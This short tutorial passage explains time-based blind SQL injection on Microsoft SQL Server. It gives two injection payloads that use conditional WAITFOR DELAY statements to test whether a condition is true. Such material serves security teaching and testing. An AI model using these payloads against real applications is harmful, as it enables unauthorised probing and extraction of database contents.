# Exploiting blind SQL injection by triggering time delays

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server,
you can use the following to test a condition and trigger a delay depending on whether the expression is true:
```bash
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```
```bash
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
